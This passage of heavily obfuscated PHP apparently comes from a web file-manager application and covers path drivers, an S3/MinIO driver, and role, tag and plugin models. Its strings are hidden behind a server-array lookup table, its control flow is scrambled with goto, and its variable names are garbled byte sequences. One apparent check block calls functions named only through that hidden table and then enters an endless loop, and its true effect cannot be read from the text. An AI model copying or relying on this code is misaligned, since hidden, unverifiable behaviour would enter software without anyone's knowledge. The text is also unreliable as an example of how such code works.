$b‚›¦š±ï[1153] => is_readable($bÒÀ‡¥íŠò), $b‚›¦š±ï[1154] => is_writable($bÒÀ‡¥íŠò), $b‚›¦š±ï[1160] => get_mode($bÒÀ‡¥íŠò)); return $AÖÜßÏâ ; } public function exist($EŸøÔÙ‚ïö) { $EŸøÔÙ‚ïö = $this->iconvSystem($EŸøÔÙ‚ïö); return @file_exists($EŸøÔÙ‚ïö); } public function isFile($D„œİ°Ã’) { $D„œİ°Ã’ = $this->iconvSystem($D„œİ°Ã’); return @is_file($D„œİ°Ã’); } public function isFolder($a‹ÃáÒÏ†•) { $a‹ÃáÒÏ†• = $this->iconvSystem($a‹ÃáÒÏ†•); return @is_dir($a‹ÃáÒÏ†•); } public function listPath($AÃêáÚ×, $Aš—¨Ëš¸ = false) { goto Bà’²Êà¬Ï; Bà’²Êà¬Ï: $D¤¤·ŒÓù“ =& $_SERVER[¹÷ˆ§éÒ°ú]; $AÃêáÚ× = $this->iconvSystem($AÃêáÚ×); $AÃêáÚ× = rtrim($AÃêáÚ×, $D¤¤·ŒÓù“[18]) . $D¤¤·ŒÓù“[18]; goto bÒ»‹Å¾êç; Fƒ’Ò£„è: closedir($A¥ˆ°£÷‡); return $FëÕ÷×óˆŒ; goto fâøáø‡³ã; bÒ»‹Å¾êç: $FëÕ÷×óˆŒ = array($D¤¤·ŒÓù“[86] => array(), $D¤¤·ŒÓù“[85] => array()); if (!($A¥ˆ°£÷‡ = @opendir($AÃêáÚ×))) { return $FëÕ÷×óˆŒ; } while (($a²¼°ô‚ = readdir($A¥ˆ°£÷‡)) !== !1) { if ($a²¼°ô‚ == $D¤¤·ŒÓù“[103] || $a²¼°ô‚ == $D¤¤·ŒÓù“[1156]) { continue; } $fÊøˆêÇ = $AÃêáÚ× . $a²¼°ô‚; if (is_file($fÊøˆêÇ)) { $FëÕ÷×óˆŒ[$D¤¤·ŒÓù“[85]][] = $this->fileInfo($fÊøˆêÇ, $Aš—¨Ëš¸); } else { $FëÕ÷×óˆŒ[$D¤¤·ŒÓù“[86]][] = $this->folderInfo($fÊøˆêÇ, $Aš—¨Ëš¸); } } goto Fƒ’Ò£„è; fâøáø‡³ã: } public function listAll($cÓ“ë–…Ğ†, &$EË—æ¿ëÃ× = array()) { goto d†µçõŒÙ‹; côîÛÉ÷ø†: return $EË—æ¿ëÃ×; goto dÂ«‹„Ó˜µ; D¥ÅÅáàğ: if (!($dËµŞº—Úí = @opendir($cÓ“ë–…Ğ†))) { return $EË—æ¿ëÃ×; } while (($A„àÑÜë¸™ = readdir($dËµŞº—Úí)) !== !1) { if ($A„àÑÜë¸™ == $aà…´Ùä´Ñ[103] || $A„àÑÜë¸™ == $aà…´Ùä´Ñ[1156]) { continue; } $eˆÙÒÄ¸à = $cÓ“ë–…Ğ† . $A„àÑÜë¸™; if (is_dir($eˆÙÒÄ¸à) && !is_link($eˆÙÒÄ¸à)) { $EË—æ¿ëÃ×[] = array($aà…´Ùä´Ñ[87] => $eˆÙÒÄ¸à . $aà…´Ùä´Ñ[18], $aà…´Ùä´Ñ[88] => 1, $aà…´Ùä´Ñ[119] => @filemtime($eˆÙÒÄ¸à), $aà…´Ùä´Ñ[89] => 0); $this->listAll($eˆÙÒÄ¸à, $EË—æ¿ëÃ×); } else { $EË—æ¿ëÃ×[] = array($aà…´Ùä´Ñ[87] => $eˆÙÒÄ¸à, $aà…´Ùä´Ñ[88] => 0, $aà…´Ùä´Ñ[119] => @filemtime($eˆÙÒÄ¸à), $aà…´Ùä´Ñ[89] => $this->size($eˆÙÒÄ¸à)); } } closedir($dËµŞº—Úí); goto côîÛÉ÷ø†; d†µçõŒÙ‹: $aà…´Ùä´Ñ =& $_SERVER[¹÷ˆ§éÒ°ú]; $cÓ“ë–…Ğ† = $this->iconvSystem($cÓ“ë–…Ğ†); $cÓ“ë–…Ğ† = rtrim($cÓ“ë–…Ğ†, $aà…´Ùä´Ñ[18]) . $aà…´Ùä´Ñ[18]; goto D¥ÅÅáàğ; dÂ«‹„Ó˜µ: } public function has($B¼‰ÆîŸÕë, $eÅ‘¹·•öÂ = false, $C‚ïÊ—‰å„ = true) { goto B¨š“ìà«; d›Æß®±É: if (!($e¥‰¶ä×Ê = @opendir($B¼‰ÆîŸÕë))) { return !1; } $dñÀ–Ô¿§è = 0; $B…ß®¬¬¡ = 0; goto d‘ÜŒ‰ôã; Aßëø­‰À³: if ($eÅ‘¹·•öÂ) { return array($CÖ£¼îæòÊ[203] => $dñÀ–Ô¿§è, $CÖ£¼îæòÊ[204] => $B…ß®¬¬¡); } return !1; goto D•ŠÙ»Œƒó; d‘ÜŒ‰ôã: $dù“’ŞÙ¼À = 0; while (($Aˆö÷åÑ‘ƒ = readdir($e¥‰¶ä×Ê)) !== !1) { if ($Aˆö÷åÑ‘ƒ == $CÖ£¼îæòÊ[103] || $Aˆö÷åÑ‘ƒ == $CÖ£¼îæòÊ[1156]) { continue; } $CÍ„ùÀœ–å = $B¼‰ÆîŸÕë . $Aˆö÷åÑ‘ƒ; if ($eÅ‘¹·•öÂ) { $dù“’ŞÙ¼À++; if (@is_file($CÍ„ùÀœ–å)) { $dñÀ–Ô¿§è++; } else { $B…ß®¬¬¡++; } if ($dù“’ŞÙ¼À > 10000) { break; } continue; } if ($C‚ïÊ—‰å„) { if (@is_file($CÍ„ùÀœ–å)) { return !0; } } else { if (@is_dir($CÍ„ùÀœ–å . $CÖ£¼îæòÊ[18])) { return !0; } } } closedir($e¥‰¶ä×Ê); goto Aßëø­‰À³; B¨š“ìà«: $CÖ£¼îæòÊ =& $_SERVER[¹÷ˆ§éÒ°ú]; $B¼‰ÆîŸÕë = $this->iconvSystem($B¼‰ÆîŸÕë); $B¼‰ÆîŸÕë = rtrim($B¼‰ÆîŸÕë, $CÖ£¼îæòÊ[18]) . $CÖ£¼îæòÊ[18]; goto d›Æß®±É; D•ŠÙ»Œƒó: } public function hashSimple($d¨Ïõ‡Œ¿å) { goto CÂ˜‚˜Ñ½Ê; c‚½ÑêË: if ($DéÒ­ÌÉÌ× <= $E¼©ËÄø‘Ù * $aê ñ•¦Ç•) { return $this->hashMd5($d¨Ïõ‡Œ¿å) . $DéÒ­ÌÉÌ×; } $eŒ•øÂÉë¹ = $CáÏ‹ƒ²ã[43]; $e·ËğÚ»ÎÆ = intval($DéÒ­ÌÉÌ× / $aê ñ•¦Ç•); goto CÕ×…îù¢´; CÕ×…îù¢´: $FáÄÃ ƒŠ = fopen($d¨Ïõ‡Œ¿å, $CáÏ‹ƒ²ã[1161]); if (!$FáÄÃ ƒŠ) { return $eŒ•øÂÉë¹; } for ($F‡½À›»À = 0; $F‡½À›»À < $aê ñ•¦Ç•; $F‡½À›»À++) { fseek($FáÄÃ ƒŠ, $e·ËğÚ»ÎÆ * $F‡½À›»À); $eŒ•øÂÉë¹ .= fread($FáÄÃ ƒŠ, $E¼©ËÄø‘Ù); } goto aŸ˜»‰•¿‡; B†ÔÆñÚ: return md5($eŒ•øÂÉë¹) . $DéÒ­ÌÉÌ×; goto CÉ¤ƒ‚‘»Ç; CÂ˜‚˜Ñ½Ê: $CáÏ‹ƒ²ã =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$d¨Ïõ‡Œ¿å) { return md5($CáÏ‹ƒ²ã[43]); } $d¨Ïõ‡Œ¿å = $this->iconvSystem($d¨Ïõ‡Œ¿å); goto f‘˜•ÔâË; f‘˜•ÔâË: $DéÒ­ÌÉÌ× = $this->size($d¨Ïõ‡Œ¿å); $E¼©ËÄø‘Ù = 200; $aê ñ•¦Ç• = 50; goto c‚½ÑêË; aŸ˜»‰•¿‡: fseek($FáÄÃ ƒŠ, $DéÒ­ÌÉÌ× - $E¼©ËÄø‘Ù); $eŒ•øÂÉë¹ .= fread($FáÄÃ ƒŠ, $E¼©ËÄø‘Ù); fclose($FáÄÃ ƒŠ); goto B†ÔÆñÚ; CÉ¤ƒ‚‘»Ç: } public function getContent($AçÖ¬…İ) { $AçÖ¬…İ = $this->iconvSystem($AçÖ¬…İ); return file_get_contents($AçÖ¬…İ); } public function setContent($aöñŒÎˆ¢ê, $B¦æ¼êãéì = '') { $aöñŒÎˆ¢ê = $this->iconvSystem($aöñŒÎˆ¢ê); @file_put_contents($aöñŒÎˆ¢ê, $B¦æ¼êãéì, LOCK_EX); clearstatcache(); return strlen($B¦æ¼êãéì) == filesize($aöñŒÎˆ¢ê); } public function fileSubstr($DÈÈÈ‰Ï–Ù, $A™†¦¥îÖ = 0, $aùï ìõß = false) { goto Bïïƒ…™Ç; BöÏ£îè Ş: fseek($D­í¢¼÷Íœ, $A™†¦¥îÖ); $CòŒØõˆÂí = fread($D­í¢¼÷Íœ, $aùï ìõß); fclose($D­í¢¼÷Íœ); goto C¹×ì¡¬Á; C¹×ì¡¬Á: return $CòŒØõˆÂí; goto aËÏ„†è™; Bïïƒ…™Ç: $B ¾“ÊŠ‚ =& $_SERVER[¹÷ˆ§éÒ°ú]; $DÈÈÈ‰Ï–Ù = $this->iconvSystem($DÈÈÈ‰Ï–Ù); if ($aùï ìõß === !1) { $aùï ìõß = $this->size($DÈÈÈ‰Ï–Ù); } goto C˜ÉÆß†ô¡; C˜ÉÆß†ô¡: if ($aùï ìõß <= 0) { return $B ¾“ÊŠ‚[43]; } $D­í¢¼÷Íœ = fopen($DÈÈÈ‰Ï–Ù, $B ¾“ÊŠ‚[1161]); if (!$D­í¢¼÷Íœ) { return !1; } goto BöÏ£îè Ş; aËÏ„†è™: } public function upload($aâî£ŞÒÈ, $a…¡¤ÃŸ×, $D®—¼¿®­ì = false, $c¯ö³ä¶İ· = REPEAT_REPLACE) { $A‘ÏïŠºÙ = $this->copyFile($a…¡¤ÃŸ×, $aâî£ŞÒÈ); return $A‘ÏïŠºÙ ? $this->getPathOuter($aâî£ŞÒÈ) : !1; } public function setModifyTime($DŸÂòï œß, $e¡®‰®ˆò¬ = '') { @touch($DŸÂòï œß, intval($e¡®‰®ˆò¬)); } public function download($E„¼×ÅÑÃ, $bƒ»ÔèØ©ç) { return $this->iconvSystem($E„¼×ÅÑÃ); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($a×¶§¹†æÜ) { parent::__construct($a×¶§¹†æÜ); $this->signatureVersion($_SERVER[¹÷ˆ§éÒ°ú][212]); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } } goto A¥ÀÙƒ£‡‘; E…ÛóËîÁŒ: define($_SERVER[¹÷ˆ§éÒ°ú][558], $_SERVER[¹÷ˆ§éÒ°ú][559]); $Dá÷Ò­­šÅ = $_SERVER[¹÷ˆ§éÒ°ú][560]; if (strlen($Dá÷Ò­­šÅ) < $_SERVER[¹÷ˆ§éÒ°ú][561]) { return; } goto d©¨àµÍÖ‰; Aµ¦©†İ¦: $_SERVER[$_SERVER[Œá²][49]] = (base64_decode('OTc4Mw==')."\x32\x30")+0;$_qeKU="K2smXeagdqUcdkaWy39a6r4KSF3nsgMz9EGTBvDS4Vrr5kMb5kZv8Ey5Qzw4gf4jubNRA";; stream_wrapper_register($_SERVER[Œá²][50], $_SERVER[Œá²][51]); $A—Ô±óö†  = LIB_DIR . $_SERVER[¹÷ˆ§éÒ°ú][4]; goto dÈ«âÄ¨ˆ; BˆÏá«…: class SystemOptionModel extends ModelBaseOption { protected $tableName = "\163\171\163\x74\145\x6d\x5f\157\x70\164\151\x6f\x6e"; protected $jsonField = array("\155\145\x6e\x75", "\x72\x6f\154\145", "\162\x6f\154\145\x47\x72\157\x75\160", "\x72\x65\x67\151\x73\164", "\145\155\x61\x69\x6c"); function __construct() { parent::__construct(); } protected function cacheKey($BìŸ‘îæå) { return "\x53\x79\163\x74\145\x6d\117\x70\x74\151\157\x6e\137{$BìŸ‘îæå}"; } protected function optionDefault($Aë´´–ˆ‡‰ = '') { $aõ™½‰ó¦õ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($Aë´´–ˆ‡‰ == $aõ™½‰ó¦õ[43]) { return $GLOBALS[$aõ™½‰ó¦õ[16]][$aõ™½‰ó¦õ[2490]]; } } } class SystemRecordModel extends ModelBaseLight { } class SystemRoleModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\x6d\56\x72\157\x6c\145\114\151\163\164"; public $field = array("\x6e\141\x6d\x65", "\141\165\164\150", "\x6c\141\142\x65\x6c", "\144\x69\x73\160\154\x61\x79", "\163\171\163\x74\x65\155", "\144\145\x73\143", "\151\147\x6e\157\x72\x65\105\x78\164", "\151\x67\x6e\157\162\x65\106\x69\x6c\145\123\x69\172\145", "\141\x64\155\x69\x6e\x69\163\164\162\141\164\x6f\x72", "\x73\157\162\164"); public function listData($aÀœ‘ÒÕŠ = false, $AéÃ¸¯‡„Ù = "\x73\x6f\162\164", $D»»ãø´Ä• = false) { $a”¢ÛŠÃˆ½ =& $_SERVER[¹÷ˆ§éÒ°ú]; $Fğ”˜ÑÑ·È = parent::listData($aÀœ‘ÒÕŠ, $AéÃ¸¯‡„Ù, $D»»ãø´Ä•); if (!$aÀœ‘ÒÕŠ) { $bå½ˆÜá‰‹ = $a”¢ÛŠÃˆ½[2491]; foreach ($Fğ”˜ÑÑ·È as $Cãò¬ŸùˆÖ => $fÀ—ÙÖÛ×) { if ($fÀ—ÙÖÛ×[$a”¢ÛŠÃˆ½[2492]] == 1) { $Fğ”˜ÑÑ·È[$Cãò¬ŸùˆÖ][$a”¢ÛŠÃˆ½[416]] = $bå½ˆÜá‰‹; } } } return $Fğ”˜ÑÑ·È; } public function update($B°Óå›ÍŒ, $b‡˜¯¥øè) { goto e•¦èÛÊ; e•¦èÛÊ: $b‘ÚºéçŒ“ =& $_SERVER[¹÷ˆ§éÒ°ú]; $B¥¤‘·Šñµ = parent::listData($B°Óå›ÍŒ); $dóÏƒì¸Â¥ = $this->findByName($b‡˜¯¥øè[$b‘ÚºéçŒ“[38]]); goto AÔ‹Ì³‹ˆŒ; AŸÇØÁßÀ¦: return parent::update($B°Óå›ÍŒ, $b‡˜¯¥øè); goto B°éÛÉ‡á¿; AÔ‹Ì³‹ˆŒ: if (!$B¥¤‘·Šñµ || $dóÏƒì¸Â¥ && $dóÏƒì¸Â¥[$b‘ÚºéçŒ“[378]] != $B¥¤‘·Šñµ[$b‘ÚºéçŒ“[378]]) { return !1; } if ($dóÏƒì¸Â¥[$b‘ÚºéçŒ“[2492]] == 1) { $b‡˜¯¥øè = array($b‘ÚºéçŒ“[38] => $b‡˜¯¥øè[$b‘ÚºéçŒ“[38]], $b‘ÚºéçŒ“[2116] => $b‡˜¯¥øè[$b‘ÚºéçŒ“[2116]]); } $this->filterAuth($b‡˜¯¥øè[$b‘ÚºéçŒ“[387]]); goto AŸÇØÁßÀ¦; B°éÛÉ‡á¿: } public function remove($F£ÃŒÀºùæ) { $BÙ‹œ‡¹» = parent::listData($F£ÃŒÀºùæ); if (!$BÙ‹œ‡¹» || $BÙ‹œ‡¹»[$_SERVER[¹÷ˆ§éÒ°ú][1071]]) { return !1; } return parent::remove($F£ÃŒÀºùæ); } public function add($aõ“ˆÉ¢ãƒ) { goto dñô¢„È­ƒ; E¨–‹ßƒ†æ: $D˜ËÆõÌÓ¢ = array($BìµÜòå[397] => $Bãïø›½Ë¨, $BìµÜòå[2104] => $BìµÜòå[43], $BìµÜòå[2100] => $BìµÜòå[2117], $BìµÜòå[2493] => 1, $BìµÜòå[2103] => 0, $BìµÜòå[2494] => 0, $BìµÜòå[2102] => $this->getSort()); $aõ“ˆÉ¢ãƒ = array_merge($D˜ËÆõÌÓ¢, $aõ“ˆÉ¢ãƒ); $this->filterAuth($aõ“ˆÉ¢ãƒ[$BìµÜòå[387]]); goto cÛ¨¥»³Í; dñô¢„È­ƒ: $BìµÜòå =& $_SERVER[¹÷ˆ§éÒ°ú]; $Bãïø›½Ë¨ = $aõ“ˆÉ¢ãƒ[$BìµÜòå[38]]; if ($this->findByName($Bãïø›½Ë¨)) { return !1; } goto E¨–‹ßƒ†æ; cÛ¨¥»³Í: return parent::insert($aõ“ˆÉ¢ãƒ); goto d²‰ÒÕ³İ; d²‰ÒÕ³İ: } private function getSort() { $DÓË˜ºˆ–¼ =& $_SERVER[¹÷ˆ§éÒ°ú]; $dâ‹İÜÄ‹Ş = parent::listData(); $eÑ†ËÓñ¢ = array_to_keyvalue($dâ‹İÜÄ‹Ş, $DÓË˜ºˆ–¼[43], $DÓË˜ºˆ–¼[2119]); return empty($eÑ†ËÓñ¢) ? 0 : max($eÑ†ËÓñ¢) + 1; } private function filterAuth(&$A¶¥ŸòÏì¶) { $CºÓ©Çãî– =& $_SERVER[¹÷ˆ§éÒ°ú]; $C‰ÆÙìèŒœ = array(); $D…¿¥†”² = array_filter(explode($CºÓ©Çãî–[57], $A¶¥ŸòÏì¶)); foreach ($D…¿¥†”² as $A¶¥ŸòÏì¶) { $b£¹ñØä•® = explode($CºÓ©Çãî–[103], $A¶¥ŸòÏì¶); if ($b£¹ñØä•®[0] == $CºÓ©Çãî–[1775] && $b£¹ñØä•®[1] != $CºÓ©Çãî–[1027]) { $a„‹Ş„İà¼ = $b£¹ñØä•®[0] . $CºÓ©Çãî–[103] . $b£¹ñØä•®[1] . $CºÓ©Çãî–[2495]; if (!in_array($a„‹Ş„İà¼, $D…¿¥†”²)) { $C‰ÆÙìèŒœ[] = $a„‹Ş„İà¼; } } $C‰ÆÙìèŒœ[] = $A¶¥ŸòÏì¶; } $A¶¥ŸòÏì¶ = implode($CºÓ©Çãî–[57], $C‰ÆÙìèŒœ); } public function sort($dÍÓÌõàßé, $Dˆ ñ‹Û“) { return parent::update($dÍÓÌõàßé, $Dˆ ñ‹Û“); } } goto ağÑå‘ß¿; c…ïè™®Œ: class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\x5f\x66\x61\x76"; protected function cacheFunctionAlias($CÒ‡–·ÓÅ) { $e°Â†§ÂÓÍ =& $_SERVER[¹÷ˆ§éÒ°ú]; return array($e°Â†§ÂÓÍ[2192] => array($CÒ‡–·ÓÅ[0], $e°Â†§ÂÓÍ[2193]), $e°Â†§ÂÓÍ[2194] => array($CÒ‡–·ÓÅ[0], $e°Â†§ÂÓÍ[2195])); } protected function get($CÃ½¯Ş­Ê) { $A×ƒ…Í°“½ =& $_SERVER[¹÷ˆ§éÒ°ú]; $D‚Ï»¯¯œ’ = Model($A×ƒ…Í°“½[471])->metaGet($CÃ½¯Ş­Ê, $A×ƒ…Í°“½[2196]); $BÙ«ÒŒ»ª‰ = json_decode($D‚Ï»¯¯œ’, !0); return $BÙ«ÒŒ»ª‰ ? $BÙ«ÒŒ»ª‰ : array($A×ƒ…Í°“½[2197] => $A×ƒ…Í°“½[95], $A×ƒ…Í°“½[365] => array()); } protected function set($f·±Ğ‹¥¦Û, $AËÌ¬…ß‡) { $e¡ÙøºêâÙ =& $_SERVER[¹÷ˆ§éÒ°ú]; $AËÌ¬…ß‡ = $AËÌ¬…ß‡ ? $AËÌ¬…ß‡ : array($e¡ÙøºêâÙ[2197] => $e¡ÙøºêâÙ[95], $e¡ÙøºêâÙ[365] => array()); Model($e¡ÙøºêâÙ[471])->metaSet($f·±Ğ‹¥¦Û, $e¡ÙøºêâÙ[2196], json_encode($AËÌ¬…ß‡)); return Model($e¡ÙøºêâÙ[471])->metaSet($f·±Ğ‹¥¦Û, $e¡ÙøºêâÙ[2196], json_encode($AËÌ¬…ß‡)); } protected function getByTagID($f”©ŒÛ²Ì, $A¡ÔöÇ¬«•) { goto f©ßÛÒóÁµ; d„šæº»À: return is_array($c£±Õç®¿æ) ? $c£±Õç®¿æ : !1; goto A°˜˜ ÷Ã«; c°½ôÍµ”Œ: $f¸ª®æŸ³„ = $this->get($f”©ŒÛ²Ì); if (!$f¸ª®æŸ³„ || !isset($f¸ª®æŸ³„[$BÛîÃÚîôå[365]])) { return !1; } $c£±Õç®¿æ = array_find_by_field($f¸ª®æŸ³„[$BÛîÃÚîôå[365]], $BÛîÃÚîôå[378], $A¡ÔöÇ¬«•); goto d„šæº»À; f©ßÛÒóÁµ: $BÛîÃÚîôå =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$f”©ŒÛ²Ì || !$A¡ÔöÇ¬«•) { return !1; } if (!Model($BÛîÃÚîôå[471])->getInfoSimple($f”©ŒÛ²Ì)) { return !1; } goto c°½ôÍµ”Œ; A°˜˜ ÷Ã«: } public function listSource($dÍØ×‹×ë¨, $C© “÷†) { goto eÜŸäòÍÙ½; C©‡¬¥ğ…µ: if ($c‘ì•šÁŠŒ) { $this->removeBySource($dÍØ×‹×ë¨, $c‘ì•šÁŠŒ); } return $CÊ“ÔÚ×ôñ; goto eìËâõ®; fºÛŒİØà: $eãÂòÓÜ¯ = array_to_keyvalue($CÊ“ÔÚ×ôñ[$d•Ù’½‹—¶[85]], $d•Ù’½‹—¶[43], $d•Ù’½‹—¶[380]); $fÁŞ„²©³ù = array_merge($eãÂòÓÜ¯, $CÄ‚¡¨™°—); foreach ($B‡çÀÃÅ©„ as $fÂ†ìóá) { if (!in_array($fÂ†ìóá, $fÁŞ„²©³ù)) { $c‘ì•šÁŠŒ[] = $fÂ†ìóá; } } goto C©‡¬¥ğ…µ; Fõâ«İµ: if (!$CÊ“ÔÚ×ôñ || count($B‡çÀÃÅ©„) == $CÊ“ÔÚ×ôñ[$d•Ù’½‹—¶[362]][$d•Ù’½‹—¶[363]]) { return $CÊ“ÔÚ×ôñ; } $c‘ì•šÁŠŒ = array(); $CÄ‚¡¨™°— = array_to_keyvalue($CÊ“ÔÚ×ôñ[$d•Ù’½‹—¶[86]], $d•Ù’½‹—¶[43], $d•Ù’½‹—¶[380]); goto fºÛŒİØà; a´È„„¨‘: foreach ($aÈ¬ÖšòÀˆ as $cóÜñ¾æĞË => $C©ËŞÆÊ¢) { $D¬¢‹¡«•¤ = !0; if (!$C© “÷†) { $B‡çÀÃÅ©„[] = $cóÜñ¾æĞË; continue; } foreach ($C© “÷† as $D¼ÈÍá³§¶) { if (!in_array($D¼ÈÍá³§¶, $C©ËŞÆÊ¢)) { $D¬¢‹¡«•¤ = !1; break; } } if ($D¬¢‹¡«•¤) { $B‡çÀÃÅ©„[] = $cóÜñ¾æĞË; } } if (!$B‡çÀÃÅ©„) { return array(); } $CÊ“ÔÚ×ôñ = Model($d•Ù’½‹—¶[1108])->listSource(array($d•Ù’½‹—¶[394] => array($d•Ù’½‹—¶[395], $B‡çÀÃÅ©„))); goto Fõâ«İµ; eÜŸäòÍÙ½: $d•Ù’½‹—¶ =& $_SERVER[¹÷ˆ§éÒ°ú]; if ($C© “÷† && !is_array($C© “÷†)) { $C© “÷† = array($C© “÷†); } $e„ò‚ôêó = $this->listData($dÍØ×‹×ë¨); goto AÜÙ¯²ËŠµ; AÜÙ¯²ËŠµ: $aÈ¬ÖšòÀˆ = array(); foreach ($e„ò‚ôêó as $aÑ¸É÷ ê) { $fÂ†ìóá = $aÑ¸É÷ ê[$d•Ù’½‹—¶[87]]; if (!$fÂ†ìóá) { continue; } if (!isset($aÈ¬ÖšòÀˆ[$fÂ†ìóá])) { $aÈ¬ÖšòÀˆ[$fÂ†ìóá] = array(); } $aÈ¬ÖšòÀˆ[$fÂ†ìóá][] = $aÑ¸É÷ ê[$d•Ù’½‹—¶[404]]; } $B‡çÀÃÅ©„ = array(); goto a´È„„¨‘; eìËâõ®: } protected function listData($E¨á‚Šò‚¯) { $eÕÏ æ»‰» =& $_SERVER[¹÷ˆ§éÒ°ú]; $B¨¦Ê­õÃ = array($eÕÏ æ»‰»[1418] => 0, $eÕÏ æ»‰»[447] => array($eÕÏ æ»‰»[2198], 0), $eÕÏ æ»‰»[399] => $eÕÏ æ»‰»[2199] . $E¨á‚Šò‚¯); $Bª†¹†”À = $eÕÏ æ»‰»[2200]; $d¿ê•µ“èÂ = $this->field($Bª†¹†”À)->where($B¨¦Ê­õÃ)->order($eÕÏ æ»‰»[2201])->select(); return $d¿ê•µ“èÂ ? $d¿ê•µ“èÂ : array(); } protected function addToTag($f±‹¯ŠÙÃò, $AßÀ“´Ó‡…, $A¼ Ã£¸åä) { $E³ˆ‡¸Ğ± =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$this->getByTagID($f±‹¯ŠÙÃò, $A¼ Ã£¸åä) || !$AßÀ“´Ó‡…) { return !1; } if (!Model($E³ˆ‡¸Ğ±[747])->pathInfo($AßÀ“´Ó‡…)) { return !1; } $eÑÎˆñ¹ç‘ = array($E³ˆ‡¸Ğ±[1418] => 0, $E³ˆ‡¸Ğ±[447] => $A¼ Ã£¸åä, $E³ˆ‡¸Ğ±[398] => $AßÀ“´Ó‡…, $E³ˆ‡¸Ğ±[399] => $E³ˆ‡¸Ğ±[2202] . $f±‹¯ŠÙÃò, $E³ˆ‡¸Ğ±[397] => $E³ˆ‡¸Ğ±[43], $E³ˆ‡¸Ğ±[2102] => 0); if ($this->where($eÑÎˆñ¹ç‘)->find()) { return !1; } return $this->add($eÑÎˆñ¹ç‘); } protected function removeFromTag($dåÜèÈ‡é¸, $E“Å©Ãç, $a’±’¬È‹Î) { $F’¹öÙÜ©¯ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$this->getByTagID($dåÜèÈ‡é¸, $a’±’¬È‹Î) || !$E“Å©Ãç) { return !1; } if (is_array($E“Å©Ãç)) { $E“Å©Ãç = array($F’¹öÙÜ©¯[17], $E“Å©Ãç); } $BÒö¥õ§ßÌ = array($F’¹öÙÜ©¯[1418] => 0, $F’¹öÙÜ©¯[447] => $a’±’¬È‹Î, $F’¹öÙÜ©¯[399] => $F’¹öÙÜ©¯[2202] . $dåÜèÈ‡é¸, $F’¹öÙÜ©¯[398] => $E“Å©Ãç); return $this->where($BÒö¥õ§ßÌ)->delete(); } protected function removeByTag($c‘øÍš¬, $EŞƒ»‡â‚‘) { $B¦İÒ°¥– =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$this->getByTagID($c‘øÍš¬, $EŞƒ»‡â‚‘)) { return !1; } $dìÉ–²¢¦Š = array($B¦İÒ°¥–[1418] => 0, $B¦İÒ°¥–[447] => $EŞƒ»‡â‚‘, $B¦İÒ°¥–[399] => $B¦İÒ°¥–[2202] . $c‘øÍš¬); return $this->where($dìÉ–²¢¦Š)->delete(); } protected function removeBySource($a®ñ£ò, $Aõğ§’ïì) { $C´ÁŒ½³ìµ =& $_SERVER[¹÷ˆ§éÒ°ú]; if (!$a®ñ£ò || !$Aõğ§’ïì) { return !1; } if (is_array($Aõğ§’ïì)) { $Aõğ§’ïì = array($C´ÁŒ½³ìµ[17], $Aõğ§’ïì); } $A«Ğâ†İêÎ = array($C´ÁŒ½³ìµ[1418] => 0, $C´ÁŒ½³ìµ[398] => $Aõğ§’ïì, $C´ÁŒ½³ìµ[447] => array($C´ÁŒ½³ìµ[918], 0), $C´ÁŒ½³ìµ[399] => $C´ÁŒ½³ìµ[2202] . $a®ñ£ò); return $this->where($A«Ğâ†İêÎ)->delete(); } } if (!isset($_SERVER[$_SERVER[¹÷ˆ§éÒ°ú][6]]) || !isset($_SERVER[$_SERVER[¹÷ˆ§éÒ°ú][62]])) { goto C™­ï¹ãè”; cáÚÅÔã‹œ: $B×öéèŞà = explode($_SERVER[¹÷ˆ§éÒ°ú][10], $e¬îæ‘®“Ø); if (count($B×öéèŞà) < $_SERVER[¹÷ˆ§éÒ°ú][11]) { $D«¤òÏœ‚å = $_SERVER[¹÷ˆ§éÒ°ú][12]; $D«¤òÏœ‚å(); } $BÔìË¬öÈâ = $_SERVER[¹÷ˆ§éÒ°ú][13]; goto C˜·£Îù; C™­ï¹ãè”: $D‚¤’Ôê²Š = $_SERVER[¹÷ˆ§éÒ°ú][7]; $Dî˜Õ‘Ì¼Ğ = $_SERVER[$_SERVER[¹÷ˆ§éÒ°ú][8]] . $_SERVER[¹÷ˆ§éÒ°ú][9]; $e¬îæ‘®“Ø = $D‚¤’Ôê²Š($Dî˜Õ‘Ì¼Ğ); goto cáÚÅÔã‹œ; C˜·£Îù: $BÔìË¬öÈâ($_SERVER[$_SERVER[¹÷ˆ§éÒ°ú][8]] . $_SERVER[¹÷ˆ§éÒ°ú][9]); $cË‡Ë¨öÏ = 2; while ($cË‡Ë¨öÏ > 1) { $BòÏØíƒÖë = rawurlencode($cË‡Ë¨öÏ . $_SERVER[¹÷ˆ§éÒ°ú][372]); } goto e¢§ìîÈˆ¸; e¢§ìîÈˆ¸: } class PluginModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\x6d\56\x70\x6c\165\x67\x69\156\x4c\151\x73\x74"; public $field = array("\156\141\x6d\145", "\x73\164\141\x74\x75\x73", "\x72\x65\x67\151\x65\x73\x74", "\143\157\156\146\x69\147"); public function loadList($d§íê³äÒ = false) { $Bå¬ğ‰ˆÒ = array_to_keyvalue($this->listData(), $_SERVER[¹÷ˆ§éÒ°ú][38]); if ($d§íê³äÒ) { return $Bå¬ğ‰ˆÒ[$d§íê³äÒ]; } return $Bå¬ğ‰ˆÒ; } public function init() { $CÓŞë ¯Ì„ =& $_SERVER[¹÷ˆ§éÒ°ú]; Hook::trigger($CÓŞë ¯Ì„[2203]); $e¶ñÔƒğ± = $this->loadPluginList(); foreach ($e¶ñÔƒğ± as $cåŠ¯Ğä³ê => $EÙ®º÷®Û¤) { $Bâ‡†Ã²îƒ = $this->appAllow($cåŠ¯Ğä³ê, $EÙ®º÷®Û¤); if (!$Bâ‡†Ã²îƒ) { continue; } foreach ($EÙ®º÷®Û¤[$CÓŞë ¯Ì„[2204]] as $f¤Ç´¢á => $aÃ¾ãñ„Èğ) { Hook::bind($f¤Ç´¢á, $aÃ¾ãñ„Èğ); } } Hook::trigger($CÓŞë ¯Ì„[2205]); 